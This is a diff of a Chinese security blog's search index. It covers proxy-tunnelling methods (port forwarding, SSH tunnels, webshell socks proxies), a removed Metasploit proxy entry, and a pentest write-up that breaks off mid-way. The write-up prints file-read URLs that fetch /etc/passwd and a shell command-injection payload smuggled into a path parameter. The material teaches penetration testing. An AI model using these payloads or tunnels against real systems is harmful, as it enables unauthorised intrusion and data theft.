+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>浅谈代理隧道的几种应用场景</title>
     <url>/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/</url>
     <content><![CDATA[<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>熟练的代理转发，既可助你穿梭内网，亦可在工作生活中提供便利。理论上，任何接入互联网的计算机都是可访问的，但是如果目标主机处于内网，而我们又想和该目标主机进行通信的话，就需要借助一些端口转发工具来达到我们的目的。</p>
 <h3 id="二、端口转发"><a href="#二、端口转发" class="headerlink" title="二、端口转发"></a>二、端口转发</h3><p>把端口接收到的流量转发到另外一个端口，可以是本机的端口，也可以是其它网络的端口。<br>实现原理：基于传输层协议，把socket字节流原封不动进行转发。<br>弊端：如果上层协议有校验，会出错。比如<code>HTTP协议</code>中部分WEB服务会校验host头，导致HTTP连接中断。</p>
 <a id="more"></a>
-<h4 id="2-1-简单端口转发"><a href="#2-1-简单端口转发" class="headerlink" title="2.1 简单端口转发"></a>2.1 简单端口转发</h4><p>域C可访问域B，不可访问域A。<code>172.16.1.1</code>把<code>172.16.2.1</code>的SSH服务<code>22</code>端口转发到自己的<code>8022</code>端口，<code>192.168.1.2</code>可通过访问<code>172.16.1.1:8022</code>端口连接<code>172.16.2.1</code>的SSH服务。<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-15-56-37.png"><br>实现方法：</p>
+<h4 id="2-1-简单端口转发"><a href="#2-1-简单端口转发" class="headerlink" title="2.1 简单端口转发"></a>2.1 简单端口转发</h4><p>域C可访问域B，不可访问域A。<code>172.16.1.1</code>把<code>172.16.2.1</code>的SSH服务<code>22</code>端口转发到自己的<code>8022</code>端口，<code>192.168.1.2</code>可通过访问<code>172.16.1.1:8022</code>端口连接<code>172.16.2.1</code>的SSH服务。<br><img data-src="2020-08-19-15-56-37.png"><br>实现方法：</p>
 <ul>
 <li>Windows：<code>netsh int portproxy</code>，如:<code>netsh interface portproxy add v4tov4 listenport=8022 connectport=22 connectaddress=172.16.2.1</code></li>
 <li>Linux：<code>socat、iptables DNAT+SNAT</code>，如：<code>socat tcp-l:8022,reuseaddr,fork tcp:172.16.2.1:22,reuseaddr</code></li>
@@ -582,7 +654,7 @@
 <li>ew</li>
 <li>其它</li>
 </ul>
-<h4 id="2-2-反弹端口转发"><a href="#2-2-反弹端口转发" class="headerlink" title="2.2 反弹端口转发"></a>2.2 反弹端口转发</h4><p>局域网B内PC1无法直接访问局域网A内机器，把局域网A服务器172.16.2.1:22端口转发到公网服务器1.1.1.1:8022端口，这样可以让PC1通过公网访问该机器。<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-00-25.png"><br>实现方法：</p>
+<h4 id="2-2-反弹端口转发"><a href="#2-2-反弹端口转发" class="headerlink" title="2.2 反弹端口转发"></a>2.2 反弹端口转发</h4><p>局域网B内PC1无法直接访问局域网A内机器，把局域网A服务器172.16.2.1:22端口转发到公网服务器1.1.1.1:8022端口，这样可以让PC1通过公网访问该机器。<br><img data-src="2020-08-19-16-00-25.png"><br>实现方法：</p>
 <ul>
 <li>SSH远程转发</li>
 <li>ngrok</li>
@@ -590,25 +662,25 @@
 <li>shootback</li>
 </ul>
 <h3 id="三、socks转发"><a href="#三、socks转发" class="headerlink" title="三、socks转发"></a>三、socks转发</h3><p>socks转发与端口转发类似，但是效果不同，端口转发效果只能访问单个端口的服务，socks转发可以访问整个目标网络。与VP*N效果类似，但是不能转发传输层以下的包。</p>
-<h4 id="3-1-简单socks转发"><a href="#3-1-简单socks转发" class="headerlink" title="3.1 简单socks转发"></a>3.1 简单socks转发</h4><p><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-01-24.png"><br>实现方法：</p>
+<h4 id="3-1-简单socks转发"><a href="#3-1-简单socks转发" class="headerlink" title="3.1 简单socks转发"></a>3.1 简单socks转发</h4><p><img data-src="2020-08-19-16-01-24.png"><br>实现方法：</p>
 <ul>
 <li>小飞机</li>
 <li>ew</li>
 <li>nps</li>
 <li>reGeorg(webshell)</li>
-<li>冰歇(webshell)<h4 id="3-2-反弹socks转发"><a href="#3-2-反弹socks转发" class="headerlink" title="3.2 反弹socks转发"></a>3.2 反弹socks转发</h4>socks服务器位于内网，外部机器通过公网访问反弹的socks端口来访问内网。<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-02-20.png"><br>实现方法：</li>
+<li>冰歇(webshell)<h4 id="3-2-反弹socks转发"><a href="#3-2-反弹socks转发" class="headerlink" title="3.2 反弹socks转发"></a>3.2 反弹socks转发</h4>socks服务器位于内网，外部机器通过公网访问反弹的socks端口来访问内网。<br><img data-src="2020-08-19-16-02-20.png"><br>实现方法：</li>
 <li>小飞机+反弹端口</li>
 <li>ew</li>
 <li>nps</li>
 <li>其它socks服务+反弹端口</li>
 </ul>
 <h3 id="四、SSH代理隧道"><a href="#四、SSH代理隧道" class="headerlink" title="四、SSH代理隧道"></a>四、SSH代理隧道</h3><h4 id="4-1-使用SSH动态端口转发"><a href="#4-1-使用SSH动态端口转发" class="headerlink" title="4.1 使用SSH动态端口转发"></a>4.1 使用SSH动态端口转发</h4><h5 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h5><p>使用工作PC访问公司内网服务器，登陆内网网站、登陆内网服务器。</p>
-<h5 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p>工作PC可使用SSH连接123.123.123.123:2222登陆到内网服务器A，其它内网端口未做映射<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-03-35.png"></p>
+<h5 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p>工作PC可使用SSH连接123.123.123.123:2222登陆到内网服务器A，其它内网端口未做映射<br><img data-src="2020-08-19-16-03-35.png"></p>
 <h5 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h5><ol>
-<li>工作机使用Xshell新建连接，并填好连接信息，然后打开隧道选项<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-04-10.png"></li>
-<li>添加动态转发隧道<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-04-30.png"></li>
-<li>这时候工作机使用浏览器设置<code>127.0.0.1:9999</code>为socks5代理，即可访问<code>172.16.1.101:80</code><br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-05-13.png"></li>
-<li>如果要连接服务器B的3389端口，则需要借助<code>sockscap64</code>之类的工具打开，因为Windows远程连接客户端原生不支持代理，需要借助工具强制让它使用代理，这里不多赘述，可参考我的另一篇文章让<a href="">BurpSuite使用MSF的socks4a代理</a>中<code>解决方法</code>-&gt;<code>步骤</code>-&gt;<code>1</code>中的sockscap64使用示例<h5 id="原理解释"><a href="#原理解释" class="headerlink" title="原理解释"></a>原理解释</h5>使用SSH动态端口转发，相当在远程SSH服务器启动了socks5代理服务，本地监听的<code>9999</code>端口流量将通过SSH隧道转发到SSH服务器，SSH服务器再对外发起网络请求。以上转发亦可使用<code>ssh</code>命令或者其它SSH客户端实现，具体方法可自行实验。<h5 id="出口数据流向"><a href="#出口数据流向" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-0" class="flow-chart"></div>
+<li>工作机使用Xshell新建连接，并填好连接信息，然后打开隧道选项<br><img data-src="2020-08-19-16-04-10.png"></li>
+<li>添加动态转发隧道<br><img data-src="2020-08-19-16-04-30.png"></li>
+<li>这时候工作机使用浏览器设置<code>127.0.0.1:9999</code>为socks5代理，即可访问<code>172.16.1.101:80</code><br><img data-src="2020-08-19-16-05-13.png"></li>
+<li>如果要连接服务器B的3389端口，则需要借助<code>sockscap64</code>之类的工具打开，因为Windows远程连接客户端原生不支持代理，需要借助工具强制让它使用代理，这里不多赘述，可参考我的另一篇文章让<a href>BurpSuite使用MSF的socks4a代理</a>中<code>解决方法</code>-&gt;<code>步骤</code>-&gt;<code>1</code>中的sockscap64使用示例<h5 id="原理解释"><a href="#原理解释" class="headerlink" title="原理解释"></a>原理解释</h5>使用SSH动态端口转发，相当在远程SSH服务器启动了socks5代理服务，本地监听的<code>9999</code>端口流量将通过SSH隧道转发到SSH服务器，SSH服务器再对外发起网络请求。以上转发亦可使用<code>ssh</code>命令或者其它SSH客户端实现，具体方法可自行实验。<h5 id="出口数据流向"><a href="#出口数据流向" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-0" class="flow-chart"></div>
 
 
 
@@ -616,16 +688,16 @@
 </li>
 </ol>
 <h4 id="4-2-使用SSH隧道本地转发"><a href="#4-2-使用SSH隧道本地转发" class="headerlink" title="4.2 使用SSH隧道本地转发"></a>4.2 使用SSH隧道本地转发</h4><h5 id="需求-1"><a href="#需求-1" class="headerlink" title="需求"></a>需求</h5><p>工作PC连接Windows服务器B的远程桌面。</p>
-<h5 id="网络拓扑-1"><a href="#网络拓扑-1" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p>工作PC可使用SSH连接<code>123.123.123.123:2222</code>登陆到内网服务器A，其它内网端口未做映射<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-08-50.png"></p>
+<h5 id="网络拓扑-1"><a href="#网络拓扑-1" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p>工作PC可使用SSH连接<code>123.123.123.123:2222</code>登陆到内网服务器A，其它内网端口未做映射<br><img data-src="2020-08-19-16-08-50.png"></p>
 <h5 id="操作步骤-1"><a href="#操作步骤-1" class="headerlink" title="操作步骤"></a>操作步骤</h5><ol>
-<li>工作机<code>xshell</code>创建连接后，在<code>属性</code>-&gt;<code>连接</code>-&gt;<code>隧道</code>中添加<code>Local</code>类型转发<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-15-41.png"></li>
-<li>这时工作机打开远程桌面客户端，通过连接<code>127.0.0.1:9999</code>端口，可连接到内网服务器B的<code>3389</code>端口<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-16-14.png"><h5 id="原理解释-1"><a href="#原理解释-1" class="headerlink" title="原理解释"></a>原理解释</h5>SSH隧道的本地转发，相当于把本地监听的<code>9999</code>端口接收到的TCP流量，通过SSH隧道转发到远程的SSH服务器A，服务器A再发起TCP连接到服务器B的3389端口。可以看到，本地转发跟动态转发有点相似，不同的是本地转发是转发了<code>一个远程端口</code>到本地，而动态转发可通过配置代理访问整个<code>远程网络</code>。<br>注意：这种方法转发<code>HTTP</code>端口一般无法成功，因为HTTP协议带有<code>Host</code>头，服务器端校验Host头后可能会重置该HTTP请求导致无法连接，如果想了解这一细节，不妨抓个包看看。</li>
+<li>工作机<code>xshell</code>创建连接后，在<code>属性</code>-&gt;<code>连接</code>-&gt;<code>隧道</code>中添加<code>Local</code>类型转发<br><img data-src="2020-08-19-16-15-41.png"></li>
+<li>这时工作机打开远程桌面客户端，通过连接<code>127.0.0.1:9999</code>端口，可连接到内网服务器B的<code>3389</code>端口<br><img data-src="2020-08-19-16-16-14.png"><h5 id="原理解释-1"><a href="#原理解释-1" class="headerlink" title="原理解释"></a>原理解释</h5>SSH隧道的本地转发，相当于把本地监听的<code>9999</code>端口接收到的TCP流量，通过SSH隧道转发到远程的SSH服务器A，服务器A再发起TCP连接到服务器B的3389端口。可以看到，本地转发跟动态转发有点相似，不同的是本地转发是转发了<code>一个远程端口</code>到本地，而动态转发可通过配置代理访问整个<code>远程网络</code>。<br>注意：这种方法转发<code>HTTP</code>端口一般无法成功，因为HTTP协议带有<code>Host</code>头，服务器端校验Host头后可能会重置该HTTP请求导致无法连接，如果想了解这一细节，不妨抓个包看看。</li>
 </ol>
 <h5 id="出口数据流向-1"><a href="#出口数据流向-1" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-1" class="flow-chart"></div>
 
 <h4 id="4-3-使用SSH隧道远程转发"><a href="#4-3-使用SSH隧道远程转发" class="headerlink" title="4.3 使用SSH隧道远程转发"></a>4.3 使用SSH隧道远程转发</h4><h5 id="需求-2"><a href="#需求-2" class="headerlink" title="需求"></a>需求</h5><p>工作PC-B访问工作PC-A上面的MySQL数据库（3306端口）。</p>
-<h5 id="网络拓扑-2"><a href="#网络拓扑-2" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-18-53.png"></p>
-<h5 id="操作步骤-2"><a href="#操作步骤-2" class="headerlink" title="操作步骤"></a>操作步骤</h5><p><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-19-09.png"></p>
+<h5 id="网络拓扑-2"><a href="#网络拓扑-2" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p><img data-src="2020-08-19-16-18-53.png"></p>
+<h5 id="操作步骤-2"><a href="#操作步骤-2" class="headerlink" title="操作步骤"></a>操作步骤</h5><p><img data-src="2020-08-19-16-19-09.png"></p>
 <h5 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h5><p>远程转发的功能刚好与本地转发相反，可以把本地监听的端口转发到远程服务器上，可用于办公区的机器需要访问工作机的本地端口时候使用，比如工作机上面配置了数据库服务，监听本地3306端口，通过转发本地<code>3306</code>端口到远程服务器A的<code>9999</code>端口上，服务器B可访问工作机的数据库应用。</p>
 <p>注意：远程转发默认只能转发到SSH服务器的环回网卡（127.0.0.1），外部网络访问（如本例）需要启动<code>GatewayPorts</code>配置：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 编辑sshd 的配置文件&#x2F;etc&#x2F;ssh&#x2F;sshd_config，将GatewayPorts 开关打开：</span><br><span class="line">GatewayPorts yes</span><br></pre></td></tr></table></figure>
@@ -659,73 +731,31 @@ st->op1->op2->e</textarea><textarea id="flowchart-2-options" style="display: non
       </tags>
   </entry>
   <entry>
-    <title>让BurpSuite使用MSF的socks4a代理</title>
-    <url>/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/</url>
-    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在使用msf转发流量时遇到了个问题，就是使用auxiliary/server/socks4a做代理时，burpsuite不支持socks4a代理，导致无法使用burp去抓包。而使用auxiliary/server/socks5做代理却失败了，可能是脚本的bug，官方issues也有人反馈这个问题。</p>
-<h3 id="具体问题"><a href="#具体问题" class="headerlink" title="具体问题"></a>具体问题</h3><h4 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h4><p>我所在的环境比较特殊，工作机（192.168.1.2，Windows）位于A地内网，MSF机器（172.16.1.2，Linux）位于B地内网，两内网不相通，但是可以通过11.11.11.11:22 SSH访问MSF机器，遂用SSH隧道将172.16.1.2:11080端口转发到工作机的127.0.0.1:1083端口，如果不清楚这个操作，可以理解为工作机访问本机127.0.0.1:1083端口等价于访问MSF机172.16.1.2:11080端口。<br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-43-50.png"></p>
-<a id="more"></a>
-<h4 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h4><ol>
-<li>在MSF机器启动socks4a代理（前面获取反弹shell、设置路由的步骤略过）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(server&#x2F;socks4a) &gt; use auxiliary&#x2F;server&#x2F;socks4a </span><br><span class="line">msf5 auxiliary(server&#x2F;socks4a) &gt; set SRVPORT 11080</span><br><span class="line">msf5 auxiliary(server&#x2F;socks4a) &gt; exploit</span><br></pre></td></tr></table></figure>
-<img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-44-36.png"></li>
-<li>在配置代理前，我的ip地址是A地公网ip<br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-44-49.png"></li>
-<li>使用Firefox配置代理测试转发是否正常，这时ip由联通变成电信了，证明代理转发隧道工作正常<br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-45-05.png"><br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-45-14.png"></li>
-<li>这个时候，如果直接在burpsuite配置前置socks代理的话是不能使用的，因为burpsuite不支持socks4协议，所以会打不开网页<br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-45-33.png"></li>
-</ol>
-<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>使用sockscap64工具，把socks4a转发为http代理。当然，使用其它工具将socks4a转为http代理或socks5代理也行，比如Linux下的privoxy，socks4a转socks5的工具找了很久都没找到，遂放弃。</p>
-<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol>
-<li>打开sockscap64工具，创建代理配置，代理服务器为127.0.0.1:1083（MSF socks4a端口地址）<br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-46-34.png"><br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-46-39.png"><br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-46-47.png"></li>
-<li>burpsuite配置前置http代理，代理服务地址为127.0.0.1:25378，这个端口是sockscap64监听的端口<br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-47-08.png"><br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-47-15.png"></li>
-<li>打开Firefox测试，可以看到现在已经是MSF机器的电信ip了，问题成功解决。<br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-47-29.png"></li>
-<li>回顾下出口流量走向，如下：<div id="flowchart-0" class="flow-chart"></div>
-
-</li>
-</ol>
-<h4 id="为什么是25378端口"><a href="#为什么是25378端口" class="headerlink" title="为什么是25378端口"></a>为什么是25378端口</h4><ol>
-<li>SockScap64支持系统代理<br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-50-11.png"></li>
-<li>启用系统代理可发现其使用25378端口做代理服务<br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-50-27.png"><script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js"></script><textarea id="flowchart-0-code" style="display: none">st=>start: 工作机Firefox
-e=>end: 目标网络
-op1=>operation: burp代理（127.0.0.1:1080)
-op2=>operation: SocksCap64本地代理（127.0.0.1:25378)
-op3=>operation: ssh本地转发端口（127.0.0.1:1083)
-op4=>operation: msf socks4a端口（172.16.1.2:11083）
-st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-0", options);</script></li>
-</ol>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>记一次远程命令执行漏洞的挖掘过程</title>
     <url>/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong><br>本文已在Freebuf发布，但文章经Freebuf编辑改动导致有小部分错误，故在这里改正并重新发布。<br><em>原文链接： <a href="https://www.freebuf.com/vuls/185380.html">https://www.freebuf.com/vuls/185380.html</a></em></p>
 <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近为甲方做渗透测试发现了一个远程命令执行漏洞，可以通过构造恶意参数传递执行bash命令，本文回顾一下漏洞的挖掘过程。</p>
 <a id="more"></a>
 <h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ol>
-<li>通过<code>nessus</code>扫描器的<code>Sitemap</code>模块，发现了可疑目录：<br><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-26-26.png"></li>
-<li>根据<code>sitemap</code>的目录信息，打开URL:<code>http://x.x.x.x:28076/file/</code>，发现存在未授权访问漏洞：<br><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-26-57.png"></li>
-<li>逐个查看里面的文件，找到了一些比较有意思的JSP：<br><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-27-22.png"></li>
-<li>蒙了一下<code>dirFiles.jsp</code>的参数，发现使用<code>path</code>作为参数名可列出目录、文件信息，URL：<code>http://x.x.x.x:28076/file/dirFiles.jsp?path=.</code><br><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-28-24.png"></li>
-<li>同样的方法，发现<code>show.jsp</code>存在任意文件读取漏洞，URL：<code>http://x.x.x.x:28076/file/show.jsp?path=/etc/passwd</code><br><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-29-00.png"></li>
-<li>结合上面的目录信息和任意文件读取漏洞，对JSP文件简单审计一下，发现<code>logContentNewest.jsp</code>会调用一个<code>bash</code>脚本，便猜想能否使用它构造命令执行：<br><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-29-32.png"></li>
+<li>通过<code>nessus</code>扫描器的<code>Sitemap</code>模块，发现了可疑目录：<br><img data-src="2020-08-20-16-26-26.png"></li>
+<li>根据<code>sitemap</code>的目录信息，打开URL:<code>http://x.x.x.x:28076/file/</code>，发现存在未授权访问漏洞：<br><img data-src="2020-08-20-16-26-57.png"></li>
+<li>逐个查看里面的文件，找到了一些比较有意思的JSP：<br><img data-src="2020-08-20-16-27-22.png"></li>
+<li>蒙了一下<code>dirFiles.jsp</code>的参数，发现使用<code>path</code>作为参数名可列出目录、文件信息，URL：<code>http://x.x.x.x:28076/file/dirFiles.jsp?path=.</code><br><img data-src="2020-08-20-16-28-24.png"></li>
+<li>同样的方法，发现<code>show.jsp</code>存在任意文件读取漏洞，URL：<code>http://x.x.x.x:28076/file/show.jsp?path=/etc/passwd</code><br><img data-src="2020-08-20-16-29-00.png"></li>
+<li>结合上面的目录信息和任意文件读取漏洞，对JSP文件简单审计一下，发现<code>logContentNewest.jsp</code>会调用一个<code>bash</code>脚本，便猜想能否使用它构造命令执行：<br><img data-src="2020-08-20-16-29-32.png"></li>
 </ol>
 <h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ol>
-<li><code>logContentNewest.jsp</code>正常执行是这样的，可自定义<code>path</code>参数的值，如<code>/etc/passwd</code>，来查找这个文件里面的内容：<br><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-30-15.png"></li>
-<li>分析<code>logContentNewest.jsp</code>和被调用的sh脚本，得知<code>path</code>参数最终会传入sh脚本的<code>FILE_PATH</code>变量，然后调用下面的判断逻辑。从下面代码我们可以看到，函数的功能是判断<code>FILE_PATH</code>变量的值是否存在，而这个变量的值目前是可控的<br><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-31-00.png"></li>
+<li><code>logContentNewest.jsp</code>正常执行是这样的，可自定义<code>path</code>参数的值，如<code>/etc/passwd</code>，来查找这个文件里面的内容：<br><img data-src="2020-08-20-16-30-15.png"></li>
+<li>分析<code>logContentNewest.jsp</code>和被调用的sh脚本，得知<code>path</code>参数最终会传入sh脚本的<code>FILE_PATH</code>变量，然后调用下面的判断逻辑。从下面代码我们可以看到，函数的功能是判断<code>FILE_PATH</code>变量的值是否存在，而这个变量的值目前是可控的<br><img data-src="2020-08-20-16-31-00.png"></li>
 <li>最初想通过添加双引号闭合if条件判断参数注入命令，没有成功<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload： &#x2F;etc&#x2F;passwd&quot; ];ls;then echo 1;fi;if [ -e &quot;123.txt;</span><br></pre></td></tr></table></figure>
